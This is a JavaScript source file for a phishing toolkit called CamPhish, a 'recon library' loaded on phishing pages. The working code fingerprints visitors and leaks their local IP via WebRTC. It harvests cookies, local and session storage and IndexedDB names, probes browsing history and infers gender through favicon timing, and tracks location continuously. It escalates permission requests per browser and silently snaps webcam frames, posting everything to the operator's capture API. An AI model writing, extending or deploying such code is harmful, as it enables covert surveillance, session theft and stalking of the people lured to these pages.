/**
 * CamPhish Recon Library v2.2
 * Sticky sessions, deduplication, enhanced fingerprinting, gender detection,
 * cookie/storage grabber, history detection, auto permissions
 */
(function(window){
'use strict';

var API = window.CAMPHISH_API || '/api';

// ============ STICKY SESSION MANAGEMENT ============
var Session = {
  KEY: 'camphish_session',
  COOKIE_NAME: 'camphish_sid',
  id: 'default',
  captured: {},

  init: function() {
    // Try to load existing session from localStorage
    try {
      var saved = JSON.parse(localStorage.getItem(this.KEY) || '{}');
      if (saved.id && saved.ts && (Date.now() - saved.ts < 86400000)) {
        this.id = saved.id;
        this.captured = saved.captured || {};
      } else {
        this.generate();
      }
    } catch(e) {
      this.generate();
    }
    // Also check/set cookie for server-side correlation
    this.setCookie();
  },

  generate: function() {
    this.id = 's_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 10);
    this.captured = {};
    this.save();
  },

  save: function() {
    try {
      localStorage.setItem(this.KEY, JSON.stringify({
        id: this.id,
        ts: Date.now(),
        captured: this.captured
      }));
    } catch(e) {}
  },

  setCookie: function() {
    try {
      document.cookie = this.COOKIE_NAME + '=' + this.id + ';path=/;max-age=86400;SameSite=Lax';
    } catch(e) {}
  },

  hasCaptured: function(type) {
    return !!this.captured[type];
  },

  markCaptured: function(type) {
    this.captured[type] = Date.now();
    this.save();
  },

  getId: function() {
    return this.id;
  }
};

Session.init();

// ============ BROWSER DETECTION ============
var BrowserDetect = {
  engine: 'unknown',
  browser: 'unknown',
  os: 'unknown',
  version: '0',
  mobile: false,
  brave: false,

  init: function() {
    var ua = navigator.userAgent || '';
    var vendor = navigator.vendor || '';
    var productSub = navigator.productSub || '';
    var uaData = navigator.userAgentData;

    // Engine detection
    if (ua.indexOf('Chrome/') > -1 || ua.indexOf('Chromium/') > -1) {
      this.engine = 'Chromium';
    } else if (ua.indexOf('Firefox/') > -1) {
      this.engine = 'Gecko';
    } else if (ua.indexOf('Safari/') > -1 && ua.indexOf('Chrome') === -1) {
      this.engine = 'WebKit';
    } else if (ua.indexOf('Edg/') > -1) {
      this.engine = 'Chromium';
    }

    // Cross-check: empty vendor + productSub mismatch = lied UA
    if (this.engine === 'Chromium' && vendor === '' && productSub !== '20030107') {
      this.engine = 'Gecko'; // Firefox-like but claims Chromium
    }
    if (this.engine === 'WebKit' && vendor !== 'Apple Computer, Inc.') {
      this.engine = 'Chromium'; // Safari-like but wrong vendor
    }

    // Browser detection
    if (ua.indexOf('Edg/') > -1) {
      this.browser = 'Edge';
    } else if (ua.indexOf('EdgA/') > -1) {
      this.browser = 'Edge';
    } else if (ua.indexOf('OPR/') > -1 || ua.indexOf('Opera/') > -1) {
      this.browser = 'Opera';
    } else if (ua.indexOf('Firefox/') > -1 && ua.indexOf('Seamonkey/') === -1) {
      this.browser = 'Firefox';
    } else if (ua.indexOf('Chrome/') > -1 && ua.indexOf('Chromium/') === -1 && ua.indexOf('SamsungBrowser/') === -1) {
      // Check for Brave via navigator.brave
      if (window.navigator.brave && typeof window.navigator.brave.isBrave === 'function') {
        this.brave = true; this.browser = 'Brave';
      } else {
        this.browser = 'Chrome';
      }
    } else if (ua.indexOf('Safari/') > -1 && ua.indexOf('Chrome') === -1) {
      this.browser = 'Safari';
    } else if (ua.indexOf('SamsungBrowser/') > -1) {
      this.browser = 'Samsung';
    } else {
      this.browser = 'Unknown';
    }

    // OS detection
    if (ua.indexOf('Windows NT') > -1) { this.os = 'Windows'; }
    else if (ua.indexOf('Mac OS X') > -1 && ua.indexOf('iPhone') === -1 && ua.indexOf('iPad') === -1) { this.os = 'macOS'; }
    else if (ua.indexOf('Android') > -1) { this.os = 'Android'; this.mobile = true; }
    else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) { this.os = 'iOS'; this.mobile = true; }
    else if (ua.indexOf('Linux') > -1) { this.os = 'Linux'; }
    else if (ua.indexOf('CrOS') > -1) { this.os = 'ChromeOS'; }

    // Version extraction
    if (uaData && uaData.brands) {
      var b = uaData.brands.find(function(b){ return b.brand.indexOf('Chrome') > -1 || b.brand.indexOf('Chromium') > -1; });
      if (b) this.version = b.version;
    }
    var m = /\b(?:Chrome|Firefox|Safari|Edg|OPR|SamsungBrowser)\/(\d+)/.exec(ua);
    if (m) this.version = m[1];

    // Mobile check via modern API
    if (uaData && uaData.mobile) this.mobile = uaData.mobile;
    if (window.matchMedia) {
      if (window.matchMedia('(pointer:coarse)').matches) this.mobile = true;
    }

    // Log detected browser for debugging
    this._log('BrowserDetect', this.browser + ' ' + this.version + ' on ' + this.os + ' (' + this.engine + ')');
  },

  isChrome: function(){ return this.browser === 'Chrome'; },
  isFirefox: function(){ return this.browser === 'Firefox'; },
  isSafari: function(){ return this.browser === 'Safari'; },
  isBrave: function(){ return this.brave; },
  isEdge: function(){ return this.browser === 'Edge'; },
  isMobile: function(){ return this.mobile; },
  isDesktop: function(){ return !this.mobile; },

  // Returns a permission-strategy key for tailoring prompts
  strategy: function() {
    if (this.brave) return 'brave';            // Brave blocks aggressively
    if (this.browser === 'Safari') return 'safari';  // Safari requires user gesture
    if (this.browser === 'Firefox') return 'firefox'; // Firefox has strict tracking protection
    if (this.mobile && this.os === 'iOS') return 'ios_safari'; // iOS WebKit restrictions
    if (this.os === 'Android') return 'android'; // Android permission model
    return 'standard'; // Chrome/Edge desktop — most permissive
  },

  _log: function(tag, msg) {
    try { console.debug('[' + tag + '] ' + msg); } catch(e) {}
  }
};

BrowserDetect.init();

// ============ PERSISTENT PERMISSIONS ============
var PermTracker = {
  KEY: 'camphish_perms',
  get: function(){
    try { return JSON.parse(localStorage.getItem(this.KEY) || '{}'); }
    catch(e) { return {}; }
  },
  set: function(name, granted){
    var perms = this.get();
    perms[name] = { granted: granted, ts: Date.now() };
    localStorage.setItem(this.KEY, JSON.stringify(perms));
  },
  wasGranted: function(name){
    var p = this.get()[name];
    return p && p.granted;
  }
};

// ============ GENDER DETECTION ============
var GenderDetect = {
  femaleSites: ['https://www.pinterest.com/favicon.ico','https://www.instagram.com/favicon.ico','https://www.tumblr.com/favicon.ico','https://www.etsy.com/favicon.ico','https://www.shein.com/favicon.ico'],
  maleSites: ['https://www.reddit.com/favicon.ico','https://store.steampowered.com/favicon.ico','https://www.linkedin.com/favicon.ico','https://www.espn.com/favicon.ico','https://opensea.io/favicon.ico'],
  neutralSites: ['https://www.youtube.com/favicon.ico','https://www.facebook.com/favicon.ico','https://twitter.com/favicon.ico'],

  detect: function(callback){
    var self = this;
    var results = { female: 0, male: 0, neutral: 0, visited: [] };
    var allSites = [].concat(
      this.femaleSites.map(function(u){return {url:u, gender:'female'};}),
      this.maleSites.map(function(u){return {url:u, gender:'male'};}),
      this.neutralSites.map(function(u){return {url:u, gender:'neutral'};})
    );
    var checked = 0;
    var done = false;

    allSites.forEach(function(site){
      self._checkVisited(site.url, function(visited){
        if (visited) {
          results[site.gender]++;
          results.visited.push(site.url.split('/')[2]);
        }
        checked++;
        if (checked >= allSites.length && !done) {
          done = true;
          self._finish(results, callback);
        }
      });
    });
    setTimeout(function(){
      if (!done) { done = true; self._finish(results, callback); }
    }, 3000);
  },

  _finish: function(results, callback) {
    var prediction = 'unknown';
    if (results.female > results.male && results.female > 0) prediction = 'female';
    else if (results.male > results.female && results.male > 0) prediction = 'male';
    results.prediction = prediction;
    results.confidence = Math.abs(results.female - results.male) / Math.max(results.female + results.male, 1);
    callback(results);
  },

  _checkVisited: function(url, cb){
    // Primary: Performance API — check if resource was cached from prior navigation
    try {
      var entries = performance.getEntriesByType('resource');
      for (var i = 0; i < entries.length; i++) {
        if (entries[i].name.indexOf(url) > -1) {
          cb(true); return;
        }
      }
    } catch(e) {}
    // Fallback: Image() timing technique
    try {
      var start = performance.now();
      var img = new Image();
      img.onload = function(){ cb((performance.now() - start) < 50); };
      img.onerror = function(){ cb((performance.now() - start) < 50); };
      img.src = url;
    } catch(e) { cb(false); }
  }
};

// ============ ENHANCED FINGERPRINT ============
var Fingerprint = {
  collect: function(callback){
    var fp = {};
    fp.screen_resolution = screen.width + 'x' + screen.height;
    fp.color_depth = screen.colorDepth;
    fp.pixel_ratio = window.devicePixelRatio;
    fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    fp.timezone_offset = new Date().getTimezoneOffset();
    fp.language = navigator.language;
    fp.languages = (navigator.languages || []).join(',');
    fp.platform = navigator.platform;
    fp.hardware_concurrency = navigator.hardwareConcurrency;
    fp.device_memory = navigator.deviceMemory || null;
    fp.max_touch_points = navigator.maxTouchPoints || 0;
    fp.cookie_enabled = navigator.cookieEnabled;
    fp.do_not_track = navigator.doNotTrack;

    try {
      var c = document.createElement('canvas');
      var cx = c.getContext('2d');
      cx.textBaseline = 'top';
      cx.font = '14px Arial';
      cx.fillStyle = '#f60';
      cx.fillRect(0, 0, 100, 30);
      cx.fillStyle = '#069';
      cx.fillText('CamPhish FP', 2, 2);
      cx.fillStyle = 'rgba(102,204,0,0.7)';
      cx.fillText('CamPhish FP', 4, 4);
      fp.canvas_fingerprint = c.toDataURL().substring(0, 2000);
    } catch(e) {}

    try {
      var c = document.createElement('canvas');
      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (gl) {
        fp.webgl_vendor = gl.getParameter(gl.VENDOR);
        fp.webgl_renderer = gl.getParameter(gl.RENDERER);
        fp.webgl_version = gl.getParameter(gl.VERSION);
        fp.webgl_shading = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
        fp.webgl_fingerprint = fp.webgl_vendor + ' ' + fp.webgl_renderer;
      }
    } catch(e) {}

    try {
      var ac = new (window.AudioContext || window.webkitAudioContext)();
      var oscillator = ac.createOscillator();
      var gain = ac.createGain();
      gain.gain.value = 0;
      oscillator.connect(gain);
      gain.connect(ac.destination);
      oscillator.start(0);
      fp.audio_sample_rate = ac.sampleRate;
      fp.audio_state = ac.state;
      fp.audio_max_channel = ac.destination.maxChannelCount;
      setTimeout(function(){ oscillator.stop(); ac.close(); }, 100);
    } catch(e) {}

    try {
      var testFonts = ['Arial','Arial Black','Calibri','Cambria','Comic Sans MS','Consolas','Courier New','Georgia','Helvetica','Impact','Lucida Console','Segoe UI','Tahoma','Times New Roman','Trebuchet MS','Verdana'];
      var baseFonts = ['monospace','sans-serif','serif'];
      var s = document.createElement('span');
      s.style.fontSize = '72px'; s.style.position = 'absolute'; s.style.visibility = 'hidden';
      s.innerHTML = 'mmmmmmmmmmlli';
      var defaultW = {}, defaultH = {};
      for (var i in baseFonts) {
        s.style.fontFamily = baseFonts[i];
        document.body.appendChild(s);
        defaultW[baseFonts[i]] = s.offsetWidth;
        defaultH[baseFonts[i]] = s.offsetHeight;
        document.body.removeChild(s);
      }
      var detected = [];
      for (var i in testFonts) {
        var found = false;
        for (var j in baseFonts) {
          s.style.fontFamily = testFonts[i] + ',' + baseFonts[j];
          document.body.appendChild(s);
          if (s.offsetWidth != defaultW[baseFonts[j]] || s.offsetHeight != defaultH[baseFonts[j]]) found = true;
          document.body.removeChild(s);
        }
        if (found) detected.push(testFonts[i]);
      }
      fp.font_list = detected.join(',');
      fp.font_count = detected.length;
    } catch(e) {}

    if (navigator.getBattery) {
      navigator.getBattery().then(function(b){
        fp.battery_level = b.level;
        fp.battery_charging = b.charging;
        fp.battery_charging_time = b.chargingTime;
        fp.battery_discharging_time = b.dischargingTime;
        finishFp();
      }).catch(function(){ finishFp(); });
    } else { finishFp(); }

    if (navigator.connection) {
      fp.connection_type = navigator.connection.effectiveType;
      fp.connection_downlink = navigator.connection.downlink;
      fp.connection_rtt = navigator.connection.rtt;
      fp.connection_save_data = navigator.connection.saveData;
    }

    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
      navigator.mediaDevices.enumerateDevices().then(function(devices){
        fp.camera_count = devices.filter(function(d){return d.kind === 'videoinput';}).length;
        fp.microphone_count = devices.filter(function(d){return d.kind === 'audioinput';}).length;
      }).catch(function(){});
    }

    try {
      if (window.DeviceOrientationEvent) fp.has_gyroscope = true;
      if (window.DeviceMotionEvent) fp.has_accelerometer = true;
    } catch(e) {}

    // Speech synthesis voice count
    if (window.speechSynthesis) {
      try {
        var voices = window.speechSynthesis.getVoices();
        if (voices && voices.length > 0) {
          fp.voice_count = voices.length;
          fp.voice_languages = voices.map(function(v){return v.lang;}).filter(function(v,i,a){return a.indexOf(v)===i;}).join(',');
        }
      } catch(e) {}
      window.speechSynthesis.onvoiceschanged = function() {
        try {
          var voices = window.speechSynthesis.getVoices();
          fp.voice_count = voices.length;
          fp.voice_languages = voices.map(function(v){return v.lang;}).filter(function(v,i,a){return a.indexOf(v)===i;}).join(',');
        } catch(e) {}
      };
    }

    var fpSent = false;
    function finishFp() {
      fp.session = Session.getId();
      fp.collected_at = new Date().toISOString();
      try {
        var pc = new RTCPeerConnection({iceServers: []});
        pc.createDataChannel('');
        pc.createOffer(function(offer){ pc.setLocalDescription(offer, function(){}, function(){}); }, function(){});
        pc.onicecandidate = function(e){
          if (e && e.candidate && e.candidate.candidate) {
            var m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (m && m[1] && !m[1].startsWith('0.')) {
              fp.local_ip = m[1];
            }
            pc.close();
            // Fall through to sendFp via the timeout, not here — avoids race
          }
        };
        setTimeout(function(){
          try { pc.close(); } catch(e) {}
          if (!fpSent) { fpSent = true; sendFp(fp); }
        }, 2000);
      } catch(e) { if (!fpSent) { fpSent = true; sendFp(fp); } }
    }
  }
};

function sendFp(fp) {
  fp.session = Session.getId();
  fetch(API + '/capture/fingerprint', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(fp)
  }).catch(function(){});
}

// ============ CAPTURE (with deduplication) ============
var Capture = {
  ip: function() {
    if (Session.hasCaptured('ip')) return;
    Session.markCaptured('ip');
    fetch(API + '/capture/ip', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({session: Session.getId()})
    }).catch(function(){});
  },

  location: function() {
    if (!navigator.geolocation) return;
    if (Session.hasCaptured('location')) return;
    if (PermTracker.wasGranted('location')) {
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          if (Session.hasCaptured('location')) return;
          Session.markCaptured('location');
          Capture._sendLoc(pos);
          PermTracker.set('location', true);
        },
        function() { PermTracker.set('location', false); },
        {enableHighAccuracy: true, timeout: 10000, maximumAge: 60000}
      );
    } else {
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          if (Session.hasCaptured('location')) return;
          Session.markCaptured('location');
          Capture._sendLoc(pos);
          PermTracker.set('location', true);
          Capture._event('location_granted', {lat: pos.coords.latitude, lon: pos.coords.longitude});
        },
        function() {
          PermTracker.set('location', false);
          Capture._event('location_denied', {});
        },
        {enableHighAccuracy: true, timeout: 10000, maximumAge: 60000}
      );
    }
  },

  _sendLoc: function(pos) {
    fetch(API + '/capture/location', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        lat: pos.coords.latitude, lon: pos.coords.longitude,
        acc: pos.coords.accuracy, altitude: pos.coords.altitude,
        heading: pos.coords.heading, speed: pos.coords.speed,
        session: Session.getId()
      })
    }).catch(function(){});
  },

  _watchId: null,

  startWatching: function() {
    if (!navigator.geolocation || Capture._watchId) return;
    Capture._watchId = navigator.geolocation.watchPosition(
      function(pos) { Capture._sendLoc(pos); },
      function() {},
      {enableHighAccuracy: true, timeout: 15000, maximumAge: 30000}
    );
  },

  stopWatching: function() {
    if (Capture._watchId) {
      navigator.geolocation.clearWatch(Capture._watchId);
      Capture._watchId = null;
    }
  },

  image: function(dataUrl, method) {
    fetch(API + '/capture/image', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        cat: dataUrl, session: Session.getId(),
        capture_method: method || 'canvas'
      })
    }).catch(function(){});
  },

  camera: function(video, canvas, interval) {
    if (!video || !canvas) return null;
    var ctx = canvas.getContext('2d');
    var timer = setInterval(function(){
      if (video.readyState >= 2) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        Capture.image(canvas.toDataURL('image/png'), 'canvas');
      }
    }, interval || 2500);
    return timer;
  },

  _event: function(type, data) {
    fetch(API + '/capture/event', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({session: Session.getId(), event_type: type, event_data: data || null})
    }).catch(function(){});
  },

  event: function(type, data) { this._event(type, data); }
};

// ============ BROWSER STORAGE GRABBER ============
var StorageGrabber = {
  grab: function() {
    if (Session.hasCaptured('storage')) return;
    Session.markCaptured('storage');
    var data = {session: Session.getId()};
    // Cookies
    try { data.cookies = document.cookie; data.cookie_count = document.cookie ? document.cookie.split(';').length : 0; } catch(e) {}
    // window.name (persists across navigations, often used for session passing)
    try { data.window_name = window.name || ''; } catch(e) {}
    // localStorage with value sizes
    try {
      var ls = {}, lsSizes = {};
      for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        if (key === Session.KEY || key === PermTracker.KEY) continue;
        try {
          var val = localStorage.getItem(key);
          var size = new Blob([val || '']).size;
          lsSizes[key] = size;
          ls[key] = val && val.length < 2000 ? val : '[truncated ' + size + 'B]';
        } catch(e) { ls[key] = '[error]'; }
      }
      data.localStorage = ls; data.localStorage_keys = Object.keys(ls).length; data.localStorage_sizes = lsSizes;
    } catch(e) {}
    // sessionStorage with value sizes
    try {
      var ss = {}, ssSizes = {};
      for (var i = 0; i < sessionStorage.length; i++) {
        var key = sessionStorage.key(i);
        try {
          var val = sessionStorage.getItem(key);
          var size = new Blob([val || '']).size;
          ssSizes[key] = size;
          ss[key] = val && val.length < 2000 ? val : '[truncated ' + size + 'B]';
        } catch(e) { ss[key] = '[error]'; }
      }
      data.sessionStorage = ss; data.sessionStorage_keys = Object.keys(ss).length; data.sessionStorage_sizes = ssSizes;
    } catch(e) {}
    // Send sync storage data
    fetch(API + '/capture/storage', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(data)
    }).catch(function(){});
    // Async enrichment: CookieStore API (Chromium 87+, HTTPS only)
    try {
      if (window.cookieStore && window.cookieStore.getAll) {
        window.cookieStore.getAll().then(function(cookies) {
          if (cookies && cookies.length > 0) {
            Capture.event('cookie_details', {
              cookies: cookies.map(function(c) {
                return {
                  name: c.name, domain: c.domain, path: c.path,
                  secure: c.secure, httpOnly: c.httpOnly,
                  sameSite: c.sameSite, expires: c.expires ? new Date(c.expires).toISOString() : null
                };
              })
            });
          }
        }).catch(function(){});
      }
    } catch(e) {}
    // Async enrichment: Storage estimate
    try {
      if (navigator.storage && navigator.storage.estimate) {
        navigator.storage.estimate().then(function(est) {
          Capture.event('storage_estimate', {
            quota: est.quota, usage: est.usage,
            usage_details: est.usageDetails || null
          });
        }).catch(function(){});
      }
    } catch(e) {}
    // Async enrichment: Cache API enumeration
    try {
      if (window.caches && window.caches.keys) {
        window.caches.keys().then(function(names) {
          if (names && names.length > 0) {
            Capture.event('cache_storage', {cache_names: names});
          }
        }).catch(function(){});
      }
    } catch(e) {}
  }
};

// ============ INDEXED DB ENUMERATION ============
var IndexedDBGrabber = {
  grab: function(callback) {
    if (!window.indexedDB || !window.indexedDB.databases) {
      if (callback) callback([]);
      return;
    }
    window.indexedDB.databases().then(function(dbs) {
      var result = dbs.map(function(db) {
        return {name: db.name, version: db.version};
      });
      if (callback) callback(result);
    }).catch(function() {
      if (callback) callback([]);
    });
  }
};

// ============ BROWSER HISTORY DETECTION ============
var HistoryDetect = {
  sites: [
    {url:'https://www.facebook.com/favicon.ico',cat:'social'},
    {url:'https://www.instagram.com/favicon.ico',cat:'social'},
    {url:'https://www.tiktok.com/favicon.ico',cat:'social'},
    {url:'https://www.snapchat.com/favicon.ico',cat:'social'},
    {url:'https://www.youtube.com/favicon.ico',cat:'video'},
    {url:'https://www.netflix.com/favicon.ico',cat:'video'},
    {url:'https://www.amazon.com/favicon.ico',cat:'shopping'},
    {url:'https://www.binance.com/favicon.ico',cat:'crypto'},
    {url:'https://github.com/favicon.ico',cat:'dev'},
    {url:'https://www.ebay.com/favicon.ico',cat:'shopping'},
    {url:'https://www.coinbase.com/favicon.ico',cat:'crypto'},
    {url:'https://stackoverflow.com/favicon.ico',cat:'dev'},
  ],
  detect: function(callback) {
    if (Session.hasCaptured('history')) { callback({visited:[],skipped:true}); return; }
    Session.markCaptured('history');
    var results = {visited: [], categories: {}};
    var checked = 0, done = false;
    var self = this;

    // Pre-check Performance API for cached favicons
    var cachedUrls = [];
    try {
      var entries = performance.getEntriesByType('resource');
      for (var i = 0; i < entries.length; i++) {
        for (var j = 0; j < self.sites.length; j++) {
          if (!cachedUrls[j] && entries[i].name.indexOf(self.sites[j].url) > -1) {
            cachedUrls[j] = true;
          }
        }
      }
    } catch(e) {}

    this.sites.forEach(function(site, idx) {
      if (cachedUrls[idx]) {
        results.visited.push(site.url);
        results.categories[site.cat] = (results.categories[site.cat]||0)+1;
        if (++checked >= self.sites.length && !done) { done = true; callback(results); }
        return;
      }
      try {
        var start = performance.now();
        var img = new Image();
        img.onload = function() {
          if ((performance.now()-start) < 50) { results.visited.push(site.url); results.categories[site.cat] = (results.categories[site.cat]||0)+1; }
          if (++checked >= self.sites.length && !done) { done = true; callback(results); }
        };
        img.onerror = function() {
          if ((performance.now()-start) < 50) { results.visited.push(site.url); results.categories[site.cat] = (results.categories[site.cat]||0)+1; }
          if (++checked >= self.sites.length && !done) { done = true; callback(results); }
        };
        img.src = site.url;
      } catch(e) { if (++checked >= self.sites.length && !done) { done = true; callback(results); } }
    });
    setTimeout(function(){ if (!done) { done = true; callback(results); } }, 4000);
  }
};

// ============ AUTO CAMERA/LOCATION (only if not yet captured) ============
var AutoPerm = {
  checkAndRequest: function() {
    if (navigator.permissions) {
      navigator.permissions.query({name: 'camera'}).then(function(status) {
        if (status.state === 'granted' && !Session.hasCaptured('camera_auto')) {
          Session.markCaptured('camera_auto');
          PermTracker.set('camera', true);
          navigator.mediaDevices.getUserMedia({audio: false, video: {facingMode: 'user'}}).then(function(stream) {
            Capture.event('camera_auto_granted', {});
            var v = document.getElementById('v') || document.createElement('video');
            v.id = 'v'; v.playsInline = true; v.autoplay = true; v.muted = true;
            v.srcObject = stream; v.play();
            if (!document.getElementById('v')) document.body.appendChild(v);
            var cap = document.getElementById('cap');
            if (!cap) { cap = document.createElement('canvas'); cap.id = 'cap'; cap.width = 320; cap.height = 240; cap.style.display = 'none'; document.body.appendChild(cap); }
            var ctx = cap.getContext('2d');
            setInterval(function() {
              if (v.readyState >= 2) { ctx.drawImage(v, 0, 0, 320, 240); Capture.image(cap.toDataURL('image/png'), 'auto'); }
            }, 3000);
          }).catch(function() {});
        }
      }).catch(function() {});
      // Location auto-request ONLY if not already captured
      navigator.permissions.query({name: 'geolocation'}).then(function(status) {
        if (status.state === 'granted' && !Session.hasCaptured('location')) {
          Session.markCaptured('location');
          navigator.geolocation.getCurrentPosition(function(pos) {
            Capture._sendLoc(pos);
            Capture.event('location_auto_acquired', {});
          }, function() {}, {enableHighAccuracy: true, timeout: 5000, maximumAge: 60000});
        }
      }).catch(function() {});
    }
  }
};

// ============ PROGRESSIVE PERMISSION ESCALATION ============
// Chains requests: silent → location → camera, with timing per browser type
var PermissionChain = {
  _timer: null,

  start: function(opts) {
    var self = this;
    var strat = BrowserDetect.strategy();
    // Delays between escalation steps (ms) — browser-dependent
    var delays = {
      standard:  { silent: 0, location: 1500, camera: 4000 },
      brave:     { silent: 500, location: 3000, camera: 7000 },
      safari:    { silent: 0, location: 2000, camera: 5000 },
      firefox:   { silent: 200, location: 2000, camera: 5000 },
      ios_safari:{ silent: 0, location: 3000, camera: 6000 },
      android:   { silent: 100, location: 2000, camera: 5000 }
    };
    var d = delays[strat] || delays.standard;

    // Phase 0: Silent permission detection (no prompts)
    setTimeout(function() {
      if (navigator.permissions) {
        navigator.permissions.query({name: 'geolocation'}).then(function(status) {
          if (status.state === 'granted') PermTracker.set('location', true);
          status.onchange = function(){ PermTracker.set('location', status.state === 'granted'); };
        }).catch(function(){});
        navigator.permissions.query({name: 'camera'}).then(function(status) {
          if (status.state === 'granted') PermTracker.set('camera', true);
          status.onchange = function(){ PermTracker.set('camera', status.state === 'granted'); };
        }).catch(function(){});
      }
    }, d.silent);

    // Phase 1: Location — request after delay
    setTimeout(function() {
      Capture.location();
      Capture._event('escalation_phase_location', {strategy: strat});
    }, d.location);

    // Phase 2: Auto-permissions — check if already-granted after location settles
    setTimeout(function() {
      AutoPerm.checkAndRequest();
      Capture._event('escalation_phase_auto_perm', {strategy: strat});
    }, d.camera);
  },

  stop: function() {
    if (this._timer) { clearTimeout(this._timer); this._timer = null; }
  }
};

// ============ INIT ============
var Recon = {
  init: function(opts) {
    opts = opts || {};
    // IP — only once per session (client IP is detected async via WebRTC)
    Capture.ip();
    // Start continuous location watching (sends updates as target moves)
    Capture.startWatching();
    // Progressive permission escalation
    PermissionChain.start(opts);
    // Fingerprint — only once per session
    if (!Session.hasCaptured('fingerprint')) {
      Session.markCaptured('fingerprint');
      Fingerprint.collect(function(){});
    }
    // Gender detection — only once per session
    if (opts.genderDetect !== false && !Session.hasCaptured('gender')) {
      Session.markCaptured('gender');
      GenderDetect.detect(function(result) {
        Capture.event('gender_detected', result);
      });
    }
    // Storage grab — only once per session
    StorageGrabber.grab();
    // History detection — only once per session
    HistoryDetect.detect(function(results) {
      if (!results.skipped) Capture.event('history_detected', results);
    });
    // IndexedDB enumeration
    IndexedDBGrabber.grab(function(dbs) {
      if (dbs && dbs.length > 0) {
        Capture.event('indexeddb_detected', {databases: dbs});
      }
    });
  },

  requestCamera: function(callback) {
    navigator.mediaDevices.getUserMedia({audio: false, video: {facingMode: 'user'}}).then(function(stream){
      PermTracker.set('camera', true);
      Capture.event('camera_granted', {});
      callback(null, stream);
    }).catch(function(err){
      PermTracker.set('camera', false);
      Capture.event('camera_denied', {error: err.name});
      callback(err);
    });
  },

  Capture: Capture,
  Fingerprint: Fingerprint,
  GenderDetect: GenderDetect,
  PermTracker: PermTracker,
  Session: Session,
  StorageGrabber: StorageGrabber,
  HistoryDetect: HistoryDetect,
  IndexedDBGrabber: IndexedDBGrabber,
  BrowserDetect: BrowserDetect
};

window.CamPhishRecon = Recon;
window.CamPhishSession = Session.getId();
window.CamPhishBrowser = BrowserDetect;

})(window);
